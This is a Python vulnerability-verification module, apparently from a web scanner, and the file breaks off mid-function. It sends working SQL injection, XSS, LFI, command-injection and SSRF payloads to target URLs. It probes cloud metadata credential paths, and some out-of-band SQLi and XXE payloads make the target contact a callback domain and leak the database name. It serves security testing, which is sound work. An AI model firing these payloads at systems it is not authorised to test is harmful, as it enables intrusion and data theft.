#!/usr/bin/env python3
"""
漏洞验证模块 - 自动验证漏洞真实性
支持: SQLi, XSS, LFI, RCE, SSRF等漏洞的自动化验证
"""

import re
import time
import hashlib
import urllib.parse
import urllib.request
import urllib.error
import ssl
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime


@dataclass
class VerificationResult:
    """验证结果"""
    vuln_type: str
    payload: str
    url: str
    is_vulnerable: bool
    confidence: str  # high, medium, low, false_positive
    evidence: str
    response_time: float
    response_code: int
    response_length: int
    verification_method: str
    recommendation: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


class VulnerabilityVerifier:
    """漏洞验证器"""
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.ssl_ctx = ssl.create_default_context()
        self.ssl_ctx.check_hostname = False
        self.ssl_ctx.verify_mode = ssl.CERT_NONE
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    def _request(self, url: str, method: str = "GET", data: str = None,
                 headers: Dict = None) -> Tuple[Optional[str], int, float, int]:
        """发送HTTP请求"""
        start = time.time()
        
        try:
            req = urllib.request.Request(url, method=method)
            req.add_header('User-Agent', self.user_agent)
            
            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)
            
            if data:
                req.data = data.encode()
            
            resp = urllib.request.urlopen(req, timeout=self.timeout, context=self.ssl_ctx)
            body = resp.read().decode('utf-8', errors='ignore')
            elapsed = time.time() - start
            
            return body, resp.status, elapsed, len(body)
            
        except urllib.error.HTTPError as e:
            elapsed = time.time() - start
            try:
                body = e.read().decode('utf-8', errors='ignore')
            except Exception:
                body = ""
            return body, e.code, elapsed, len(body)
        except Exception:
            return None, 0, time.time() - start, 0
    
    def verify_sqli_time_based(self, url: str, param: str, delay: int = 5) -> VerificationResult:
        """时间盲注验证 - 增强版，减少误报"""
        # 多次基准请求取平均值和标准差，减少网络波动影响
        base_times = []
        for _ in range(5):  # 增加到5次基准测试
            _, _, bt, _ = self._request(url)
            base_times.append(bt)
        
        base_time = sum(base_times) / len(base_times)
        # 计算标准差用于动态阈值
        variance = sum((t - base_time) ** 2 for t in base_times) / len(base_times)
        std_dev = variance ** 0.5
        # 动态阈值：基准时间 + 延迟 + 2倍标准差
        dynamic_threshold = base_time + delay + (std_dev * 2)

        # Sleep payload - 扩展支持更多数据库
        payloads = [
            f"' AND SLEEP({delay})--",
            f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
            f"'; WAITFOR DELAY '0:0:{delay}'--",
            f"' AND pg_sleep({delay})--",
            f"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",  # Oracle
            f"'; SELECT SLEEP({delay});--",  # SQLite
            f"' AND BENCHMARK({delay}000000,SHA1('test'))--",  # MySQL BENCHMARK
        ]

        # 第一轮检测
        first_pass_results = []
        for payload in payloads:
            test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
            _, code, elapsed, length = self._request(test_url)

            # 严格阈值：响应时间必须显著大于动态阈值
            if elapsed >= dynamic_threshold and elapsed >= delay * 0.9:
                first_pass_results.append((payload, elapsed, test_url, code, length))
        
        # 二次验证：对第一轮检测到的进行确认
        for payload, first_elapsed, test_url, code, length in first_pass_results:
            # 二次请求验证
            _, _, second_elapsed, _ = self._request(test_url)
            
            # 两次都延迟才确认
            if second_elapsed >= delay * 0.85 and first_elapsed >= delay * 0.85:
                # 计算一致性：两次延迟差异不超过30%
                diff_ratio = abs(first_elapsed - second_elapsed) / max(first_elapsed, second_elapsed)
                if diff_ratio < 0.3:
                    return VerificationResult(
                    vuln_type="SQL Injection (Time-based Blind)",
                    payload=payload,
                    url=test_url,
                    is_vulnerable=True,
                    confidence="high",
                    evidence=f"Response delayed {elapsed:.2f}s (expected {delay}s)",
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="time_delay",
                    recommendation="立即修复! 使用参数化查询替代字符串拼接"
                )
        
        return VerificationResult(
            vuln_type="SQL Injection",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No time delay detected",
            response_time=base_time,
            response_code=200,
            response_length=0,
            verification_method="time_delay"
        )
    
    def verify_sqli_boolean(self, url: str, param: str) -> VerificationResult:
        """布尔盲注验证 - 增强版，减少误报"""
        # 首先获取原始响应作为基线
        original_body, original_code, _, original_len = self._request(url)
        
        # True条件 - 扩展payload
        true_payloads = [
            "' AND '1'='1", "' AND 1=1--", "') AND ('1'='1",
            "' AND 'a'='a", "1 AND 1=1", "' OR '1'='1' AND '1'='1"
        ]
        # False条件
        false_payloads = [
            "' AND '1'='2", "' AND 1=2--", "') AND ('1'='2",
            "' AND 'a'='b", "1 AND 1=2", "' OR '1'='1' AND '1'='2"
        ]
        # 错误条件 - 用于排除普通错误页
        error_payloads = ["'", "''", "\""]
        
        # 获取错误响应特征
        error_lengths = []
        for ep in error_payloads:
            error_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(ep)}")
            error_body, _, _, error_len = self._request(error_url)
            if error_body:
                error_lengths.append(error_len)
        
        for true_p, false_p in zip(true_payloads, false_payloads):
            true_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(true_p)}")
            false_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(false_p)}")
            
            true_body, true_code, _, true_len = self._request(true_url)
            false_body, false_code, _, false_len = self._request(false_url)
            
            if true_body and false_body:
                # 排除：true响应与错误响应相似（说明是语法错误不是布尔差异）
                if error_lengths and any(abs(true_len - el) < 50 for el in error_lengths):
                    continue
                
                # 检查响应差异
                len_diff = abs(true_len - false_len)
                code_diff = true_code != false_code
                
                # True响应应该与原始响应相似
                true_vs_original = abs(true_len - original_len)

                # 使用百分比差异而非固定阈值
                min_len = min(len(true_body), len(false_body))
                max_len = max(len(true_body), len(false_body))
                len_diff_ratio = (max_len - min_len) / max_len if max_len > 0 else 0

                # 内容差异检测 - 使用百分比
                diff_count = sum(1 for i in range(min_len) if true_body[i] != false_body[i])
                content_diff_ratio = diff_count / min_len if min_len > 0 else 0
                
                # 增强检查：True响应应与原始响应相似度高
                true_vs_original_ratio = true_vs_original / original_len if original_len > 0 else 1
                
                # 三重验证条件:
                # 1. True/False差异明显
                # 2. True与原始响应相似（相似度>90%）
                # 3. False与原始响应不同
                has_significant_diff = len_diff_ratio > 0.1 or code_diff or content_diff_ratio > 0.05
                true_matches_original = true_vs_original_ratio < 0.15  # True响应与原始差异<15%
                
                if has_significant_diff and true_matches_original:
                    # 二次验证：再发一次请求确认
                    verify_true, _, _, verify_true_len = self._request(true_url)
                    verify_false, _, _, verify_false_len = self._request(false_url)
                    
                    # 验证响应一致性
                    verify_diff = abs(verify_true_len - verify_false_len)
                    if verify_diff > min(verify_true_len, verify_false_len) * 0.05:
                        return VerificationResult(
                            vuln_type="SQL Injection (Boolean-based Blind)",
                            payload=f"True: {true_p} | False: {false_p}",
                            url=url,
                            is_vulnerable=True,
                            confidence="high",  # 二次验证通过提升为high
                            evidence=f"Response diff: len_ratio={len_diff_ratio:.2%}, code={true_code}vs{false_code}, verified=True",
                            response_time=0,
                            response_code=true_code,
                            response_length=true_len,
                            verification_method="boolean_diff_verified",
                            recommendation="使用参数化查询, 实施输入验证"
                        )
        
        return VerificationResult(
            vuln_type="SQL Injection",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No boolean difference detected",
            response_time=0,
            response_code=200,
            response_length=0,
            verification_method="boolean_diff"
        )
    
    def verify_sqli_error(self, url: str, param: str) -> VerificationResult:
        """报错注入验证"""
        error_patterns = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
            r"PostgreSQL.*ERROR", r"pg_query\(\)", r"pg_exec\(\)",
            r"ORA-[0-9]{5}", r"Oracle.*Driver", r"SQLServer.*Driver",
            r"ODBC.*Driver", r"SQLite.*error", r"sqlite3\.OperationalError",
            r"Unclosed quotation mark", r"quoted string not properly terminated",
        ]
        
        payloads = ["'", "\"", "' OR '", "'; --", "1'1", "1 AND 1=1"]
        
        for payload in payloads:
            test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
            body, code, elapsed, length = self._request(test_url)
            
            if body:
                for pattern in error_patterns:
                    match = re.search(pattern, body, re.IGNORECASE)
                    if match:
                        return VerificationResult(
                            vuln_type="SQL Injection (Error-based)",
                            payload=payload,
                            url=test_url,
                            is_vulnerable=True,
                            confidence="high",
                            evidence=f"SQL error found: {match.group()[:100]}",
                            response_time=elapsed,
                            response_code=code,
                            response_length=length,
                            verification_method="error_pattern",
                            recommendation="禁用详细错误信息, 使用参数化查询"
                        )
        
        return VerificationResult(
            vuln_type="SQL Injection",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No SQL error patterns found",
            response_time=0,
            response_code=200,
            response_length=0,
            verification_method="error_pattern"
        )
    
    def verify_xss_reflected(self, url: str, param: str, payload: str) -> VerificationResult:
        """反射型XSS验证 - 增强版，减少误报"""
        # 生成唯一标记（使用更长的随机标记避免碰撞）
        import random
        import string
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        marker = f"xss{random_suffix}"
        
        # 替换payload中的标记
        test_payload = payload.replace("XSS", marker).replace("alert(1)", f"alert('{marker}')")
        test_payload = test_payload.replace("'XSS'", f"'{marker}'")
        test_payload = test_payload.replace("alert('XSS')", f"alert('{marker}')")
        test_payload = test_payload.replace("alert(document.cookie)", f"alert('{marker}')")
        test_payload = test_payload.replace("alert(document.domain)", f"alert('{marker}')")
        
        test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(test_payload)}")
        body, code, elapsed, length = self._request(test_url)
        
        if body:
            # 检查是否反射 - 完善HTML实体编码检测
            raw_reflected = marker in body
            encoded_reflected = urllib.parse.quote(marker) in body

            # HTML实体编码检测 (&#x27; &#39; &lt; &gt; 等)
            html_entity_patterns = [
                f"&#{ord(c)};" for c in marker  # 十进制实体
            ] + [
                f"&#x{ord(c):x};" for c in marker  # 十六进制实体
            ]
            html_encoded = any(p in body.lower() for p in html_entity_patterns)
            
            # 增强：检测更多编码形式
            js_escaped = marker.replace("'", "\\'") in body or marker.replace('"', '\\"') in body
            unicode_escaped = any(f"\\u00{ord(c):02x}" in body.lower() for c in marker[:3])
            
            # 检查输出上下文 - 更精细的分析
            context_info = self._analyze_xss_context(body, marker)

            # 检查是否在危险上下文中 - 扩展列表
            dangerous_contexts = [
                f"<script>{marker}", f"<script>alert('{marker}')",
                f"onerror={marker}", f"onclick={marker}", f"onload={marker}",
                f"onmouseover={marker}", f"onfocus={marker}", f"onblur={marker}",
                f"<img src=x onerror=alert('{marker}')",
                f"javascript:{marker}",
                f"<svg onload={marker}",
                f"<body onload={marker}",
                f"<iframe src=\"javascript:{marker}",
                f"expression({marker}",  # IE特定
                f"url({marker}",  # CSS注入
            ]

            in_dangerous_context = any(ctx in body for ctx in dangerous_contexts)
            
            # 更精确的上下文判断
            in_script_tag = self._is_in_script_context(body, marker)
            in_event_handler = self._is_in_event_handler(body, marker)
            in_href_src = self._is_in_href_or_src(body, marker)

            # 决定是否为真正的XSS
            if raw_reflected and not encoded_reflected and not html_encoded and not js_escaped and not unicode_escaped:
                # 确定置信度
                if in_script_tag or in_event_handler:
                    confidence = "high"
                    evidence = f"Payload in executable context: script={in_script_tag}, event={in_event_handler}"
                elif in_href_src:
                    confidence = "high"
                    evidence = "Payload in href/src attribute (javascript: possible)"
                elif in_dangerous_context:
                    confidence = "high"
                    evidence = f"Payload reflected in dangerous context"
                else:
                    # 只是反射但不在可执行上下文 - 需要进一步分析
                    confidence = "medium"
                    evidence = f"Payload reflected without encoding. Context: {context_info}"
                
                return VerificationResult(
                    vuln_type="Cross-Site Scripting (Reflected XSS)",
                    payload=test_payload,
                    url=test_url,
                    is_vulnerable=True,
                    confidence=confidence,
                    evidence=evidence,
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="reflection_check_enhanced",
                    recommendation="实施输出编码, 使用CSP头"
                )
            elif encoded_reflected or html_encoded:
                return VerificationResult(
                    vuln_type="XSS (Potentially Safe)",
                    payload=test_payload,
                    url=test_url,
                    is_vulnerable=False,
                    confidence="high",
                    evidence="Payload is properly encoded",
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="reflection_check"
                )
        
        return VerificationResult(
            vuln_type="XSS",
            payload=test_payload,
            url=test_url,
            is_vulnerable=False,
            confidence="low",
            evidence="Payload not reflected",
            response_time=elapsed if body else 0,
            response_code=code,
            response_length=length,
            verification_method="reflection_check"
        )
    
    def verify_lfi(self, url: str, param: str, payload: str) -> VerificationResult:
        """LFI漏洞验证"""
        test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
        body, code, elapsed, length = self._request(test_url)
        
        if body:
            # Linux文件特征
            linux_indicators = {
                "/etc/passwd": ["root:", "bin:", "daemon:", "nobody:", "/bin/bash", "/bin/sh"],
                "/etc/shadow": ["root:", "$6$", "$5$", "$1$"],
                "/proc/version": ["Linux version", "gcc version"],
            }
            
            # Windows文件特征
            windows_indicators = {
                "win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
                "hosts": ["localhost", "127.0.0.1"],
                "boot.ini": ["[boot loader]", "[operating systems]"],
            }
            
            found_evidence = []
            
            # 检查Linux
            for file_path, markers in linux_indicators.items():
                if file_path in payload:
                    for marker in markers:
                        if marker in body:
                            found_evidence.append(f"Found '{marker}' from {file_path}")
            
            # 检查Windows
            for file_path, markers in windows_indicators.items():
                if file_path in payload:
                    for marker in markers:
                        if marker in body:
                            found_evidence.append(f"Found '{marker}' from {file_path}")
            
            if found_evidence:
                return VerificationResult(
                    vuln_type="Local File Inclusion (LFI)",
                    payload=payload,
                    url=test_url,
                    is_vulnerable=True,
                    confidence="high",
                    evidence="; ".join(found_evidence[:3]),
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="content_check",
                    recommendation="使用白名单验证文件路径, 禁止目录穿越"
                )
        
        return VerificationResult(
            vuln_type="LFI",
            payload=payload,
            url=test_url,
            is_vulnerable=False,
            confidence="low",
            evidence="No sensitive file content found",
            response_time=elapsed if body else 0,
            response_code=code,
            response_length=length,
            verification_method="content_check"
        )
    
    # ========== XSS上下文分析辅助方法 ==========
    
    def _analyze_xss_context(self, body: str, marker: str) -> str:
        """分析XSS payload的输出上下文"""
        if marker not in body:
            return "not_reflected"
        
        # 找到marker的位置
        pos = body.find(marker)
        # 获取前后100个字符的上下文
        start = max(0, pos - 100)
        end = min(len(body), pos + len(marker) + 100)
        context = body[start:end]
        
        # 分析上下文
        if "<script" in context.lower() and "</script>" in context.lower():
            return "inside_script_tag"
        elif re.search(r'on\w+\s*=', context, re.IGNORECASE):
            return "event_handler"
        elif re.search(r'<\w+[^>]*' + re.escape(marker), context):
            return "html_attribute"
        elif re.search(r'href\s*=|src\s*=', context, re.IGNORECASE):
            return "url_attribute"
        elif "<style" in context.lower():
            return "css_context"
        else:
            return "html_body"
    
    def _is_in_script_context(self, body: str, marker: str) -> bool:
        """检查marker是否在<script>标签内"""
        if marker not in body:
            return False
        
        # 使用正则检查是否在script标签内
        script_pattern = r'<script[^>]*>.*?' + re.escape(marker) + r'.*?</script>'
        return bool(re.search(script_pattern, body, re.IGNORECASE | re.DOTALL))
    
    def _is_in_event_handler(self, body: str, marker: str) -> bool:
        """检查marker是否在事件处理器属性中"""
        if marker not in body:
            return False
        
        # 事件处理器模式: onclick="...marker..."
        event_pattern = r'on\w+\s*=\s*["\'][^"\']*' + re.escape(marker)
        return bool(re.search(event_pattern, body, re.IGNORECASE))
    
    def _is_in_href_or_src(self, body: str, marker: str) -> bool:
        """检查marker是否在href或src属性中"""
        if marker not in body:
            return False
        
        # href/src模式
        url_attr_pattern = r'(?:href|src)\s*=\s*["\'][^"\']*' + re.escape(marker)
        return bool(re.search(url_attr_pattern, body, re.IGNORECASE))
    
    def verify_rce_time_based(self, url: str, param: str, delay: int = 5) -> VerificationResult:
        """RCE时间验证"""
        payloads = [
            f"; sleep {delay}",
            f"| sleep {delay}",
            f"|| sleep {delay}",
            f"& sleep {delay} &",
            f"`sleep {delay}`",
            f"$(sleep {delay})",
            f"; ping -c {delay} 127.0.0.1",
            # Windows payloads
            f"& ping -n {delay} 127.0.0.1 &",
            f"| timeout /t {delay}",
        ]

        # 修复: 多次基准请求取平均值
        base_times = []
        for _ in range(3):
            _, _, bt, _ = self._request(url)
            base_times.append(bt)
        base_time = sum(base_times) / len(base_times)

        for payload in payloads:
            test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
            _, code, elapsed, length = self._request(test_url)

            # 修复: 响应时间必须显著大于基准时间+延迟
            expected_delay = base_time + delay
            if elapsed >= expected_delay - 0.5 and elapsed >= delay * 0.8:
                return VerificationResult(
                    vuln_type="Remote Code Execution (RCE)",
                    payload=payload,
                    url=test_url,
                    is_vulnerable=True,
                    confidence="high",
                    evidence=f"Command execution confirmed. Delay: {elapsed:.2f}s",
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="time_delay",
                    recommendation="严重漏洞! 立即修复, 使用白名单命令执行"
                )
        
        return VerificationResult(
            vuln_type="RCE",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No command execution detected",
            response_time=base_time,
            response_code=200,
            response_length=0,
            verification_method="time_delay"
        )
    
    def verify_ssrf(self, url: str, param: str, callback_url: str = None) -> VerificationResult:
        """SSRF验证"""
        # 修复: 完善内部地址探测，添加Azure/GCP/阿里云元数据
        internal_targets = [
            # 本地地址
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            "http://127.1",
            # AWS元数据
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            # GCP元数据
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/",
            # Azure元数据
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            # 阿里云元数据
            "http://100.100.100.200/latest/meta-data/",
            # DigitalOcean元数据
            "http://169.254.169.254/metadata/v1/",
            # Kubernetes
            "http://kubernetes.default.svc",
        ]
        
        for target in internal_targets:
            test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(target)}")
            body, code, elapsed, length = self._request(test_url)
            
            if body:
                # 修复: 扩展云元数据检测指标
                indicators = [
                    # AWS
                    "ami-id", "instance-id", "iam/security-credentials",
                    # GCP
                    "project-id", "instance/zone", "service-accounts",
                    # Azure
                    "vmId", "subscriptionId", "resourceGroupName",
                    # 阿里云
                    "instance-id", "region-id", "zone-id",
                    # 通用
                    "localhost", "127.0.0.1",
                    "root:", "daemon:",  # /etc/passwd
                    "kube-system", "kubernetes",  # K8s
                ]
                
                for indicator in indicators:
                    if indicator in body:
                        return VerificationResult(
                            vuln_type="Server-Side Request Forgery (SSRF)",
                            payload=target,
                            url=test_url,
                            is_vulnerable=True,
                            confidence="high",
                            evidence=f"Internal resource accessed. Found: {indicator}",
                            response_time=elapsed,
                            response_code=code,
                            response_length=length,
                            verification_method="internal_access",
                            recommendation="限制出站请求, 使用URL白名单"
                        )
        
        return VerificationResult(
            vuln_type="SSRF",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No SSRF indicators found",
            response_time=0,
            response_code=200,
            response_length=0,
            verification_method="internal_access"
        )
    
    def batch_verify(self, findings: List[Dict]) -> List[VerificationResult]:
        """批量验证漏洞"""
        results = []
        
        for finding in findings:
            url = finding.get("url", "")
            param = finding.get("param", "")
            vuln_type = finding.get("type", "").lower()
            payload = finding.get("payload", "")
            
            if "sqli" in vuln_type or "sql" in vuln_type:
                result = self.verify_sqli_error(url, param)
                if not result.is_vulnerable:
                    result = self.verify_sqli_boolean(url, param)
                if not result.is_vulnerable:
                    result = self.verify_sqli_time_based(url, param)
            
            elif "xss" in vuln_type:
                result = self.verify_xss_reflected(url, param, payload)
            
            elif "lfi" in vuln_type or "file" in vuln_type:
                result = self.verify_lfi(url, param, payload)
            
            elif "rce" in vuln_type or "command" in vuln_type:
                result = self.verify_rce_time_based(url, param)
            
            elif "ssrf" in vuln_type:
                result = self.verify_ssrf(url, param)
            
            else:
                continue
            
            results.append(result)

        return results


# ========== 统计学漏洞验证器 (新增) ==========

from typing import Callable
import statistics


@dataclass
class StatisticalVerification:
    """统计验证结果"""
    vuln_type: str
    url: str
    param: str
    payload: str
    rounds: int
    positive_count: int
    confidence_score: float  # 0-1
    is_confirmed: bool
    details: List[Dict] = field(default_factory=list)
    recommendation: str = ""


class StatisticalVerifier:
    """
    统计学漏洞验证器
    通过多轮测试降低误报率
    """

    # 置信度阈值
    CONFIDENCE_THRESHOLDS = {
        "high": 0.8,      # 80%以上确认
        "medium": 0.6,    # 60%以上可疑
        "low": 0.4,       # 40%以下可能误报
    }

    def __init__(self, base_verifier: VulnerabilityVerifier = None):
        self.verifier = base_verifier or VulnerabilityVerifier()

    def verify_with_statistics(self, vuln_type: str, url: str, param: str,
                                payload: str, rounds: int = 5) -> StatisticalVerification:
        """
        多轮统计验证

        Args:
            vuln_type: 漏洞类型 (sqli/xss/lfi/rce/ssrf)
            url: 目标URL
            param: 参数名
            payload: 测试Payload
            rounds: 验证轮数

        Returns:
            StatisticalVerification
        """
        results = []
        positive_count = 0

        for i in range(rounds):
            result = self._single_verify(vuln_type, url, param, payload)
            results.append({
                "round": i + 1,
                "is_vulnerable": result.is_vulnerable,
                "confidence": result.confidence,
                "evidence": result.evidence[:100] if result.evidence else ""
            })
            if result.is_vulnerable:
                positive_count += 1

            # 短暂延迟避免触发限流
            time.sleep(0.5)

        # 计算置信度
        confidence_score = positive_count / rounds

        # 判断是否确认
        is_confirmed = confidence_score >= self.CONFIDENCE_THRESHOLDS["high"]

        # 生成建议
        if is_confirmed:
            recommendation = f"漏洞已确认 ({positive_count}/{rounds}轮阳性)，建议立即修复"
        elif confidence_score >= self.CONFIDENCE_THRESHOLDS["medium"]:
            recommendation = f"可疑漏洞 ({positive_count}/{rounds}轮阳性)，建议人工复核"
        else:
            recommendation = f"可能误报 ({positive_count}/{rounds}轮阳性)，建议忽略或深入分析"

        return StatisticalVerification(
            vuln_type=vuln_type,
            url=url,
            param=param,
            payload=payload,
            rounds=rounds,
            positive_count=positive_count,
            confidence_score=confidence_score,
            is_confirmed=is_confirmed,
            details=results,
            recommendation=recommendation
        )

    def _single_verify(self, vuln_type: str, url: str, param: str,
                       payload: str) -> VerificationResult:
        """单次验证"""
        vuln_type_lower = vuln_type.lower()

        if "sqli" in vuln_type_lower or "sql" in vuln_type_lower:
            # 依次尝试不同方法
            result = self.verifier.verify_sqli_error(url, param)
            if not result.is_vulnerable:
                result = self.verifier.verify_sqli_boolean(url, param)
            if not result.is_vulnerable:
                result = self.verifier.verify_sqli_time_based(url, param, delay=3)
            return result

        elif "xss" in vuln_type_lower:
            return self.verifier.verify_xss_reflected(url, param, payload)

        elif "lfi" in vuln_type_lower:
            return self.verifier.verify_lfi(url, param, payload)

        elif "rce" in vuln_type_lower:
            return self.verifier.verify_rce_time_based(url, param, delay=3)

        elif "ssrf" in vuln_type_lower:
            return self.verifier.verify_ssrf(url, param)

        # 默认返回未验证
        return VerificationResult(
            vuln_type=vuln_type,
            payload=payload,
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="Unsupported vuln type",
            response_time=0,
            response_code=0,
            response_length=0,
            verification_method="none"
        )

    def batch_statistical_verify(self, findings: List[Dict],
                                  rounds: int = 3) -> List[StatisticalVerification]:
        """
        批量统计验证

        Args:
            findings: 漏洞发现列表
            rounds: 每个漏洞的验证轮数

        Returns:
            统计验证结果列表
        """
        results = []

        for finding in findings:
            url = finding.get("url", "")
            param = finding.get("param", "")
            vuln_type = finding.get("type", "")
            payload = finding.get("payload", "")

            if not url or not vuln_type:
                continue

            result = self.verify_with_statistics(
                vuln_type=vuln_type,
                url=url,
                param=param,
                payload=payload,
                rounds=rounds
            )
            results.append(result)

        return results

    def get_summary(self, results: List[StatisticalVerification]) -> Dict:
        """
        生成验证摘要

        Args:
            results: 统计验证结果列表

        Returns:
            摘要信息
        """
        confirmed = [r for r in results if r.is_confirmed]
        suspicious = [r for r in results if not r.is_confirmed and
                      r.confidence_score >= self.CONFIDENCE_THRESHOLDS["medium"]]
        likely_fp = [r for r in results if
                     r.confidence_score < self.CONFIDENCE_THRESHOLDS["medium"]]

        return {
            "total": len(results),
            "confirmed": len(confirmed),
            "suspicious": len(suspicious),
            "likely_false_positive": len(likely_fp),
            "confirmed_vulns": [
                {"type": r.vuln_type, "url": r.url, "confidence": f"{r.confidence_score:.0%}"}
                for r in confirmed
            ],
            "suspicious_vulns": [
                {"type": r.vuln_type, "url": r.url, "confidence": f"{r.confidence_score:.0%}"}
                for r in suspicious
            ]
        }


def verify_vuln_statistically(url: str, param: str, vuln_type: str,
                               payload: str, rounds: int = 5) -> Dict:
    """
    便捷函数: 统计学验证漏洞

    Args:
        url: 目标URL
        param: 参数名
        vuln_type: 漏洞类型
        payload: Payload
        rounds: 验证轮数

    Returns:
        验证结果字典
    """
    verifier = StatisticalVerifier()
    result = verifier.verify_with_statistics(vuln_type, url, param, payload, rounds)

    return {
        "vuln_type": result.vuln_type,
        "url": result.url,
        "param": result.param,
        "rounds": result.rounds,
        "positive_count": result.positive_count,
        "confidence_score": f"{result.confidence_score:.0%}",
        "is_confirmed": result.is_confirmed,
        "recommendation": result.recommendation,
        "details": result.details
    }


# ========== OOB集成验证器 (新增) ==========

class OOBIntegratedVerifier:
    """
    OOB带外集成验证器
    用于验证盲SSRF、盲XXE、盲SQLi等需要带外交互的漏洞
    """
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.base_verifier = VulnerabilityVerifier(timeout)
        self._oob_client = None
    
    def _get_oob_client(self):
        """获取OOB客户端"""
        if self._oob_client is None:
            try:
                from modules.oob_detector import InteractshClient
                self._oob_client = InteractshClient()
            except ImportError:
                return None
        return self._oob_client
    
    def verify_blind_ssrf_with_oob(self, url: str, param: str) -> VerificationResult:
        """
        使用OOB验证盲SSRF
        
        Args:
            url: 目标URL
            param: 参数名
            
        Returns:
            VerificationResult
        """
        oob = self._get_oob_client()
        if not oob:
            # 回退到普通SSRF验证
            return self.base_verifier.verify_ssrf(url, param)
        
        # 生成OOB回调URL
        callback_url = oob.generate_url("ssrf")
        
        # 构造payload
        test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(callback_url)}")
        
        # 发送请求
        self.base_verifier._request(test_url)
        
        # 等待并轮询OOB交互
        time.sleep(3)
        interactions = oob.poll(timeout=10)
        
        if interactions:
            return VerificationResult(
                vuln_type="Server-Side Request Forgery (Blind SSRF)",
                payload=callback_url,
                url=test_url,
                is_vulnerable=True,
                confidence="high",
                evidence=f"OOB回调确认: {len(interactions)}次交互",
                response_time=0,
                response_code=200,
                response_length=0,
                verification_method="oob_callback",
                recommendation="严重漏洞! 限制出站请求, 使用URL白名单"
            )
        
        # 回退到普通验证
        return self.base_verifier.verify_ssrf(url, param)
    
    def verify_blind_sqli_with_oob(self, url: str, param: str, dbms: str = "mysql") -> VerificationResult:
        """
        使用OOB验证盲SQL注入
        
        Args:
            url: 目标URL
            param: 参数名
            dbms: 数据库类型
            
        Returns:
            VerificationResult
        """
        oob = self._get_oob_client()
        if not oob:
            # 回退到时间盲注
            return self.base_verifier.verify_sqli_time_based(url, param)
        
        callback_domain = oob.generate_dns("sqli")
        
        # 根据数据库类型选择OOB payload
        oob_payloads = {
            "mysql": f"' AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.{callback_domain}\\\\a'))--",
            "mssql": f"'; EXEC master..xp_dirtree '\\\\{callback_domain}\\a'--",
            "oracle": f"' AND UTL_HTTP.REQUEST('http://{callback_domain}/'||user)--",
            "postgresql": f"'; COPY (SELECT '') TO PROGRAM 'nslookup {callback_domain}'--",
        }
        
        payload = oob_payloads.get(dbms, oob_payloads["mysql"])
        test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
        
        # 发送请求
        self.base_verifier._request(test_url)
        
        # 等待OOB交互
        time.sleep(5)
        interactions = oob.poll(timeout=15)
        
        if interactions:
            return VerificationResult(
                vuln_type=f"SQL Injection (OOB - {dbms})",
                payload=payload,
                url=test_url,
                is_vulnerable=True,
                confidence="high",
                evidence=f"OOB DNS回调确认: {interactions[0].remote_address if interactions else 'N/A'}",
                response_time=0,
                response_code=200,
                response_length=0,
                verification_method="oob_dns",
                recommendation="严重漏洞! 使用参数化查询"
            )
        
        # 回退到时间盲注
        return self.base_verifier.verify_sqli_time_based(url, param)
    
    def verify_blind_xxe_with_oob(self, url: str, body: str = "") -> VerificationResult:
        """
        使用OOB验证盲XXE
        
        Args:
            url: 目标URL
            body: 原始请求体（XML）
            
        Returns:
            VerificationResult
        """
        oob = self._get_oob_client()
        if not oob:
            return VerificationResult(
                vuln_type="XXE",
                payload="N/A",
                url=url,
                is_vulnerable=False,
                confidence="low",
                evidence="OOB client not available",
                response_time=0,
                response_code=0,
                response_length=0,
                verification_method="oob_required"
            )
        
        callback_url = oob.generate_url("xxe")
        
        # XXE OOB payload
        xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{callback_url}">
]>
<root>&xxe;</root>'''
        
        # 发送请求
        try:
            import urllib.request
            req = urllib.request.Request(url, data=xxe_payload.encode(), method='POST')
            req.add_header('Content-Type', 'application/xml')
            urllib.request.urlopen(req, timeout=self.timeout)
        except Exception:
            pass
        
        # 等待OOB交互
        time.sleep(5)
        interactions = oob.poll(timeout=15)
        
        if interactions:
